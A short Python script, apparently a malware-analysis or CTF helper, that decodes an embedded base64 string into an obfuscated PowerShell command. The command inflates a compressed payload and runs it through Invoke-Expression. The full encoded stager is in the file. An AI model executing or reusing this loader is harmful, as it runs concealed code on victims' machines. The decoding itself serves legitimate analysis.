import base64
import binascii

enc = "LgAoACAAJABzAEgARQBMAEwAaQBkAFsAMQBdACsAJABzAGgAZQBMAGwAaQBkAFsAMQAzAF0AKwAnAHgAJwApACgAbgBlAFcALQBvAEIAagBFAEMAdAAgAGkAbwAuAFMAdABSAGUAYQBNAFIARQBhAEQAZQByACgAIAAoAG4AZQBXAC0AbwBCAGoARQBDAHQAIABzAHkAUwB0AGUAbQAuAEkATwAuAGMATwBtAHAAUgBlAHMAcwBpAE8AbgAuAGQARQBmAGwAQQB0AEUAUwB0AFIARQBhAE0AKABbAFMAWQBTAFQARQBNAC4AaQBPAC4ATQBlAE0AbwBSAHkAUwB0AFIARQBBAE0AXQAgAFsAUwB5AHMAdABlAE0ALgBDAG8ATgBWAEUAcgBUAF0AOgA6AGYAcgBPAE0AQgBBAFMARQA2ADQAUwB0AHIASQBOAGcAKAAgACcAbABWAFoAZABjADkAcgBJAEUAbgAzADMAcgA5AEQAMQBwAG0ANwBzAFkAcwBFAFkATQBNAGEAdQB5AHEAMQB0AGcAUQBRAHkAbgAwAEkAUwBHAEoASQA4AEMARwBrAFEAcwByADYAdwBKAEoAQgB4ADcAWQArAC8AZgBXAFIAdgBrAHQAMQBLADcAZABhACsAWgBJAEoAbQBwAHYAdgAwAE8AYQBkADcAcgBNAFgASABKAEIARABWAHAAZABqAE0AeABmAE4AQgBaAEwAbABVAHQAVgBKAGYATwB0AC8AbAArAGYANwArADYAdQByADYAcgBsAEcANwBiAG4AZABxAHoAWgB0AGEANQArAGIASwBzAHkATgBSADIAKwBWAFIAZQBDADUAVgBwADQAZAA4ADYANABkAEMATwB1AC8AZQBmADEAbgA2AHMAWgBzAFUAMgBSAGYAagBsAE8AVQBpAGEAagBhACsANABHAEQAdQA4ADIARQAzAEQATQAvAFAAegBqADQAcwBzADUAMgB4AEUAMgBFAG8AZgBaAEkAbQBvAHEAaABPAE4AMAAvAEMANABVAHgATwBFAHIAMwAvAGQAMgBrADQAcQBiAC8AUABhACsAVwBwAHMAdwAvAEcATABrAGwAegA1ADUARAB6ACsAVwA5ADMAYQA5ADEAVQAyAEwAbgA0AFkAKwB2AGkALwBJAE8ASQBqAC8AZgAyAGYAdQAvAGEAdQBmADEAbAA3AEQAdABwAGsAaQBYAGIALwBEAHUAWQAzAEUANQB6AGEAUwB6AGkAdwA1AGQAWgBtAG4AaQBwAEgAYgAxAC8ATwArAHkALwBuADUAWgBNAHcAZAA5AHIAWQBSAHkAYwBYADMANQBQAFcAegBQAHQAMQBCAFAANQB6AE0ANQAzAGoATwBBAHQAVQBWAGIAVwBsAGkAWgBKAC8AcgAzAE0AOQBCAEIAegBnAGMAMQBHAFQAYgB5AEkAOAB4ACsAdQBVACsAbwBkAEkAaABIAG4ARwBXADcALwBFAHoAKwAvAFMAbgBQAGgAKwBiAHkAUgAvAGgAagBDAHMASQAvAGkANAB2AEwAcwBUAFAAcwAzACsAbwBTAEoANQA4AGUAMQAvAFcANwAvAFQALwByAHMAYQAwAHoARQArAFIAbgAvAEkAMQBWAGYAagB0AHUALwBPAHkAUgBWAHUAegAvAGYAUABqACsAYgBpAHkAZwA1AGkAcQByAEcAdgAvADgAMgB6AFgAOQAvAHYAaAB2ADUAawBSAC8AWQArAGUAdQAzAC8ANQBRADAAUwBwAGsASQBEAG0AbQBZADIAZgBmADMAWABFADQAUwA3ACsAMABzAEsANQBMAFUAegBTAFQAeAA0AHUAZgBTAC8AeQBRAE8ANQBZAG8AcwB5AEoATgA5AHoAWQA5ADkATgB0AGMAaABFACsAawArAFQAYwBwAHEAMwAvAGkAMgArAEUAdgBHAEEAUAArADAAVgBmAGsAawBYAGYAUgBGAFgAaAAwAGwAagBoADMAaQBoAFAAUwA3AHQATgB5AEoAVgBIAHkAegBJADkAdABrAEwAOQBMADgASgBDAG0AeAB2AFEAbQBGAEsAMQBYAEYAcwAyAFMAbQBCADMARgBaAG0ANwBCAGcAWgB4ACsAZwBmAG0AbQBJAEgAKwBKACsAcQBUAGwASgB2AFAAVwA5AEwANgBrAFQASgBqAEgAYgBBAEEAWQB2AEsAUwBuAC8ATgBVADkANwBJAGYAWAA4AGwAQgBNAGsANgBVAG0AcQBxAGsAbgBxAEMARQA0AEYAYQAvADAAMAB6AHIAOABKAFUAQQBJADYARwAzADgAVAA0AFQAMwBzAHoAOABoACsAUQAvAGYARwBjAEwAWABIAFAAdgBKAGoATwAvAGUAVABtAEUARwBVAG4AdgA3AFQAZgBwAG4AagBqAEgAWAA3ADYANQA3ADAAaABsAEYAeQB5AGwAYQBVAFUAagBZAEEATAA1AEgAdwBiAEEAbQBsAFMATwBlAEIANwB5AGEAeABuAFQAYgBhAHQANwArAEYAaAB6AHoASgBiAGEANABxAE8AcABjAGcAbwBuAFIAdQA1AGsASQBvADAAYQB6AHgAMgAvAFYALwBtAHIAKwBjAG4ANQBYAE4AVwBEAFYAQwBJAGYAWgBTADEAUgBBAGMAbQBrAFYAdQAvAEQAegByAC8AdgBRAFgAMwBkADkAegAzADIAOQBzAEoAegBqAHMAegAzADYAUgBwAEkAdQBKAFUAbABRAFQAKwBVAEYAMABUAFUAbgB5AHAAegBVAGoAVAB4AFUAYQBwADQAcgBkAFUAOQBLAEwAUAAyADAAYQBKAHkATQBYADQANQBvADIAcgBUAG4AVABhAEoAWQBxAFcAYQBaAE4ANAAxAHAAUABiAEUAZABrAEsAcABuAEoAVgA4AFkAWABuADMARgBJAGkAWABCAG8ATABNAFoASgB1AGsASQA0AGUALwB4AFYAKwBwAHkAdABNAG0AdwA0AHkAZQBTAG8AcABPAGIAWAArADMAcwAxAG4AVQBhAHkAYgBTAGoAdABWAHAAYgBQAHQAWQBsADMAOABUAEYAYwBQAEwAagAyAFgAVgBhAG8AZwArAFoAagBlAHYAdABrAG4AZwA3AGUAeQBrAHAAMgB2AFUAUABuAFYAcgBlAFcALwBxADAAbABuAHUAegA2AHMAeABtADgARwBKAFgAaABkAGoAMQBKAGMAbgArAHgATwBBAFMAMwBmAGoAYgB2AFgARABXAE0ASwBCAHoAWgBkAHEARQAyADYANgA3AGoAdABHAC8AdQA3AG8AbwAwAHUAMQBWAEMALwB5AGsANAAzAEIANwA3AEwANABWAEYAMwBpAEEAdAArAGsAZAAvAGYAVwBvAHYAdgBmAHIAVgBmAHEATgAxAHQAdgAyAEgAVwBIADUAOQBDAE4AcQBUACsAWABxAHgAdABZADIAUgAyAHgAaQBNADUANwBsAGUAegAxADEAdAAyADMAdQBkAFAATwBTAHAAZABiAGYATABUADgATgAxAHIAZwAyAEwAMgBCAEMAcgBZAE8AagBjAHIAUgArAFYAWABqAGIASgBqAHMAMQBaAG8AcgBRAEcAcgBkAFgATgBvAGIATgBsADQAOAB2AE8AeQAvAFoAdwBPADkANQBYACsAdgBWAEYAKwBuAGcASQB6AGYAcgBOAFYAZQBBADUASwA4AGUAaAB2AFQAMQBKAFcAdwAvAEQAKwByAFUALwBuAFYAaAB0AE4AUgBzAHQASwAxADIATgBiAHMAMAB0AHUAVgBxADQAbABCAFAARABUAFAAYwA5ADIAOAA1AFcANAB5AGcAWgBiAE0AVgBkAHYAaABSADMAbwBUAGIAcgBHAEEAdgBGAGEAMQBlADgAVQBkAHMAdABLAHYATABrADQAWABHAFMATwB3AHUAMwBQAHEAdgBRADgAWABYAHkAbQBGAGgANQA2ADcAaQBOAHgAdAB0ACsATQA0ADcAVAB1AGoAbwBlAGgAZgBWAFYAUAB2AFIAZgBxAE4AVwBkAGoAYgBmAGEAZABIAHUAegBhAGoAdwBIADgAKwB1AFcAMwBZADUATQBNAFkANAAyAEoALwBkAGsANwB4AGMAMwA0AGUAeQA1AGsAdQBuAE8AegBjAEUAWgA1AFUAZABqAGMAegBWAGQASgBtADYAUgBQAE4AYQB0AGIATgBSAFMATwA4ADYAcwBQAFIAaABPAHIAZQBSAG8ARgBhADkAWABIAGYAMQBPADIANgB6AFMAaQBxAFAASABrAFQAKwBJADAAdQB0AG0AWABxAGsAVQBCADIAMwAzAHUAdABmAHEALwBzAGEAcQAxACsAdgByAGYAdQBjAGwAegBpAFoAcQBQAEwAbgAxAE8AdwBPAGgAVgBYAFMAaABHAG8AUABXAGwATwBTAFgANQAyAFkALwBUAEwAcQBaAEsAbwBiAEIAeQBMADYAWgB6ADUANwBTAGkAbABqAG8AMQAyAHMAcgA3AFQAOQBIAHcAZgBoAFIATwA5AEoAYQBXADkAdwB1ADMAVQA2ADgAcgBvAHgAbgBnAGQAYgBZAG0AbABPADUAQwBQAGEANwBwAFUAKwB2AEEAOQBXAFEAcgAzAHQAbQBzAGwANAA4AGIAcgBQAG8ANwByAFQATgAzAGUASABnAGwATQBXAEQAYgBGAEIAOAArAHYAVAB4AFUAdgBvAFYAbgBqAEwAWgBVADMANQBTADYAeQBiAFIAYgBDADQAeQBnADEAcwBUADcAdAB5AG4AdwBqAEQAOABhAFIAeABOAFgAWQBXAHQAMQBsAFAAZwAyAEwAbQBTAEcAZABJAGwANwBwAG4ASwBTADEANABUAEUAeQBkAHgAdABiAGoAUAArADcAYgBSADkAYgBYAEwAeQA5AHAAYwBrAEoAcwBuAHkAcwBTADkAdQBQAHkAOQBKAGwAMQBJAEgANAB5AEIATQBnAHIAOQAzAHUAZgByAHIANQBVAFAAMgBVADQAWgBqAFQAVAAzADgAMwBYAHoAYQArAFgAagA0ADAAZgAwAGoAawBhAFUAawBOAEsAaQB1AFMANAAzAHEAVgB1AG4AVABTAEYAMwBTAFUAbABvAHIAYwBzADkAVQBuAFgAaQBmAFkALwA2AEEAWgBrAEYASABVAGcAZABrADAAdgB5AGkAUgBTAEwAZABGADIAZQAwAEUARABEAHYAUgAwAHAATwB0AFkAVABkAFQAMABhAGsAagB6AEYAdgBsAHQAUQBUAHYAMABPADYAWgA0ADgAcABEADYAZgBMADIAUwBMAHUAcwBUAHgAWgBKAE0ARwBBAFYAbQBGAFgATQBkADMAVQArAGUANAB5AG4AdgA4AC8AcABoAFgATwBTAGUAVgB5AFAARgBrAGwAUQBaAGoAYwBnAHIANQBnAFoAUQBPAGIAVAB5AGMAMAA0AEUAcgBJAHEAVgBBAGYAZwB0ADUASABNAFQAOQBoAHEATwBPAC8AQgB2AGcARgBEAHIAeQBsAEwAaAB5ADYAcgBiAEkAMABPAFUAWgBWAGwATwBYAFEANQB6AGoATwBrACsAawB2AHUAUAA0ADQAZgA2AGoAegB2AFcAcQBHAGUASwB1AGsAWgAvAHIAVgBhAGwAZgBwADUARQBuAFAANgBFAGUAMAA1AE0AYgBaAFYANgBQADgANgBwADEAbQBuAHIAVQBKAG0AVwBGADMAegBPAGMANAAzAHAAMwB5AEQALwBYAHEAVQBFADkASABYAEgAcQBwAEcAcgBJAFAANgBXACsAdwAvAGcAbwBwAG4ANQBCAGkANQBJAFgAbgBWAFkANgAzAFoAUgA1AEMAcgBsAFAAaQBrAGYAagBRAGwANABCAHoANgBTAFEAbgA4AEUALwAxADMARwBOAGUAMAB0AGQAWABpAEMALwBUAGIASgBDAEEANAB1AG0AUgBFADEAUwBGAFYAcgBvADgAaQBQADAANABmAE0ATAA4AEcAawBqAGYANAAvADUAQQB6AC8AOQBqAEEAVAA0ADcAbQBaAGsARgBNAHkAYgBtAGcARAAvAEUAYgB6AFkAdQByAHcAawBkAFUAVwB1AEwAcQBmAFUAYwAvAEQANwBGAFQAZwA1ADcAcABGADYARwBuAGoASgBnAGQATQBrAGoAdABkAFgAMwB2AEQAMQB4AGoAUQBtAE8AWQBCAE8AcQB3AEwAMQBNAFkANABTAHYANABQADYAWAB4AEcASABlAGMAeQBBAGgAMwBHAGsAdwBNAG0ANABtAEMAOABIAE8AQgBoAHYANgBaAHMAWQBkAGYATAA1AEoAcgA2ADcAbgByAHcASABMAGcARwArAFYASQBmAFcAQgBSAFgAVQA3AFoAQgBEAHMAZwA5AGYAYwBCAE4ARwBPAEcAZAA0AE0AdQB1AHYAawBTAGgANQB5ADIAagBpAE0AWgArAE0AZAArAGwAeABIAGYAMABWADgAOABoADEAcwBpAC8AVwBSAEMAZgBFAFoANQAwAE4AMQBHAG4AcABIAEkALwBYAE4AYgBHAFAAKwBOAHkAYwA1AEQAYgA4AHoAdgBGAEsAMwBSAGYAQQAzAC8AZQBnADgAdwAwAHAARwBlAEwAVgBrAFoAZgA1AGEAbABLAC8AQgBSADUAQwArAE0AUQB1ADUAQgBIAHEAbgB1AHEAeQBUAGEAcQBIAE8AaABYAG8AWgBxAEwAdQB3AFEAcQA2ADYAZABDAEgAZABhADgAagAvADQAVABZAFAAOAB5AFAAcQAxAFAAcgBIAFoAOABQAFAAbgBYADQAYQBPAEQAUgAyAG0ATgBkAG0AUwAvAEcAVwBVAEMAZgBPAGUAcABXAFMAeAArAHQAdwBOAHUARwBXAEQALwBXAGMAYQBLAHoASABsAHoAdgB1AHUAQgA3AGoARwBPAEYAVgBWAEgAQQB6AHcANQAxAE8AQgA3AHkASgBZAHkAWAA3AC8AYwBVADYARABqAEQAOQB3AFgANABoAEMAOABMAGUAUQB4AGUAaAB3AFgAMwBNADkAZQBsADYALwBDAE4AagB2AHcAeQAvAEcAZABBAEwAOQA3AFgANABRAHYAMgA3AFEATAA5AFAAUwBEAHcAVgBPAHAAZQA5AGcASAA2AFIAZQBkADkAcABjAFEAZABVAGkAOABBAFgANAAvAHcAMgB4AFQAMwBPAGEANQBGAFgAQwBmAHUAbwAyAC8AWgByAHgATwBQAFUAcQB3AG0ATQBRADcATwB3AC8ATQBnAGgAWAA0AG0AOQBHAFAAKwBUAFAARABjAEwAOAA4AEgAcQBKAFAAdgBwADYAaQBMAC8AVgBEAHEAcwB5AFQAZwBZAGYANgBJADYAMgBOACsATwBXADgATwBIAEwAdwBPADQATQBNAE4ALwBNAEQANgBzAFIALwA3ACsATQA0ACsAegBSAEMASAArADYAUQBPAEgAWgBtAEgARgB1AEsAeABEAGoAMwBNAEUANwBPAGMARwA1AGcAegB2AEwASQB1AFMANQAxADkATQBsAEMAZwBxAHcASABlAEoAcQBpADMAdAAwAEsAZAAxAHQAdABjAGcAdgA4ADEAOQBGACsAQQBlAGIAVwBDAFQAcQB6AFAAcABPAFEATAAvAGMAVgA0AFcAWAA5AEwAWgB6ADEASwBuAGEARgBMAEEAVgA0AGEANABHAEgAbABzAFcANAA4AHQAeABZAEYAMQAxAEgAVwBqADMAbwA4ADQARgAyAFUAdgBrAEYAZAByAEEALwA3ACsAdwBuAHgAMgBNADgAYQBjAEoAdgBGAFcANQA4AHoARAB3AHYAMABsAFUAQwBjAG4AZwBjAGYAMwB3AEQALwB5AHMATgBjADAAcQBEAG4ARQAvAHAALwBBADEANgA0ADMAdwB6AGkARgBYAHoAbwA5AEEAcQAvAEQAOABFADMAMwAyAGQAYwBEAC8AQQAzADkAMAAyAEIAKwA1AHgALwBqADcAbwBXADYAQQB2AG0AaQAzAC8AYgA2AEMALwBHADAAWQBMAGYAVwBlADgAcABjAEcAMwBRAFgAKwBWAGMAWQBGADIAaABPACsASwB3AFQANgAxAHkAZgBxADcAUQBGAHgAcgBtAEcAKwBPAFYAeQA3ADcAawB4AHgASwA2AHoAQQB2ADAAZgB3AGYAegAvAGgAWABuACsATgA0AEkALwBpADMAbgBDAFAATgBrAGUAZQBpAFQAQgBMADUATgB3AFQAUAByAFAAdwBmAC8AeQA3AEoAZQBEAGYAZABmAE0ARQBkAFoAbAB3AG4ANABZAG4AOAAyAG8AQwBQAHYAUAA1AFQAOABGAC8AQwBkAEQAcgB3AEgAegBJADEAaABlAFkANQB3AC8AZwBGAHoAYQA0ADIANQByAEoAVAB2AFQAaABOADUAdQBVADgAUwArAEoAdgA5AEkATgBNAGcAQQBVADkAOQA2AEsATgA3ADkASQBMADMAWgBGAEgANgBMAEEARwBPAEYAZgByAFUAdwBkAHgAagBmAHcAdgA0ADUAVwAxAHUAagBGAEMALwB3AEgAeABrAGYAdgBqACsASwAzADYAegBuACsAKwBvAFYANgBlAEgAZwB2AFoANAAxADAAWgA0AGQAMQBqAFgAWgBUAGwASAB2ADcAOAA3AE4AdgBxAEcAVgA3ADMAMABRAFoAMQA5AHoAbgA3AHIAbAArACsAVwBDAGQAMwA0AEgAVABwAGcAbgAvAHUANgBmAEQAOABjADkAQgAvAHYAVwArAC8ANwBKAHYAYgA1AE8ANgA4AEIAMwBoADEAKwBuADkAcgBVAFMAOQBDAGYANgBvAC8AdgBwAGYAWAArAFgAbABvAEYAdgAxAC8AZABnAEkAWgA0AHgANwBvAEYATABZAHUAMwBkADUATAAxAHEAUwBQAFAAdQBuAHkASAB4AHMAZwBiAHcAQQA4AGIAOQBOAE0AZgA3AHgAagAzAHUANABVADUAQQBUAC8AcABxAEMAdgBBAHUAMQBmAGkAMQBjAHMAKwAwAEgARgBQAFIAWAArAHUAOABYAGMARAA3ADIAKwBKADMAMgBXAHUAZgA0AGkALwBFADcAcgA2AG0AeQA4ADQAWAA5AG0AUABIAEcAYwBPAFgAbABqAGYAUgAvAFIATAB0ADMAdwBQAGsALwBmADkATQBmAEsAdgAzAC8AZAA1AGYAcgByAHcAMQB3AFAAZQB2ADYANABEAC8ASgAvACsARAB3AD0APQAnACkALABbAGkAbwAuAEMATwBNAFAAUgBlAHMAUwBJAG8ATgAuAEMAbwBNAHAAcgBlAFMAcwBpAG8ATgBNAG8AZABlAF0AOgA6AEQARQBjAE8ATQBQAHIAZQBzAHMAIAApACAAKQAsAFsAcwBZAHMAdABFAG0ALgB0AEUAWAB0AC4AZQBOAEMATwBkAEkATgBnAF0AOgA6AGEAUwBjAEkAaQApACkALgBSAEUAYQBEAFQAbwBFAE4AZAAoACAAKQA="
dec = base64.b64decode(enc)
# print(binascii.hexlify(dec))
byte_list = dec.split(b'\x00')
new_string = b""
for _byte in byte_list:
    _byte = _byte.lstrip(b'b\'')
    _byte = _byte.rstrip(b'\'')
    new_string += _byte
print(new_string)